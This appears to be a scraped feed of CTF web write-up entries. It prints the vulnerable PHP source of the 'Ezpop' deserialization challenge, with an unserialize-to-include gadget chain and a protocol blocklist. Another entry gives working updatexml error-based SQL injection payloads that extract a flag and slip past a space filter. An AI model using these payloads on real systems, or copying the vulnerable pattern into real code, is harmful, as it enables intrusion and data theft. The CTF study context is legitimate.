entry.title: MRCTF(Web+Misc+Crypto)
entry.summary:
web

Ezpop

<?php
//flag is in flag.php
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
entry.content:
web

Ezpop

<?php
//flag is in flag.php
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}

entry.title: 易霖博YCTF-共克时艰-停课不停赛(web)
entry.summary:
注一下
好像是攻防世界的原题。。
注册一个"||updatexml(1,(version()),1)#
登陆后。修改密码会报错。报错注入拿flag。用()绕过空格
"||updatexml(1,concat(0x7e,(select(flag)from(flag)),0x7e),1)#
entry.content:

好像是攻防世界的原题。。
注册一个"||updatexml(1,(version()),1)#
登陆后。修改密码会报错。报错注入拿flag。用()绕过空格

entry.title: [SWPUCTF 2016]Web blogsys(hash扩展攻击+变量覆盖)
entry.summary:
github下载源码审计。
首先从配置文件common.php开始审计
一个很明显的变量覆盖漏洞

entry.title: [HITCON 2017]Baby^h Master PHP(Phar反序列化+匿名函数)
entry.summary:
题目给出了源码。有两个功能。一个是upload。一个是show
upload呢。是输入一个URL。然后会访问URL/avatar.gif然后保存到本地
show呢。是读取这个gif文件。
entry.content:
题目给出了源码。有两个功能。一个是upload。一个是show
upload呢。是输入一个URL。然后会访问URL/avatar.gif然后保存到本地
show呢。是读取这个gif文件。
